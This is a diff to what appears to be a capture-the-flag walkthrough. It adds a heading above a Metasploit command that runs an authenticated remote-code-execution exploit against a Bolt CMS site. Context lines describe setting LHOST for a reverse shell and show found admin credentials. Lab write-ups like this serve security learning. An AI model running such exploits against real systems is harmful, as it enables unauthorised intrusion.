@@ -125,6 +125,8 @@ PASSWORD => boltadmin123
 #### LHOST is the ip of our machine’s vpn ( note: we don’t get reverse shell if we use our own ip )
 #### USERNAME and PASSWORD is that we found in previous enumeration
 #### TARGETURI is where you want to put our website url. here its bolt website in port 8000
+
+## Running the exploit:
 ```
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > run
 ```
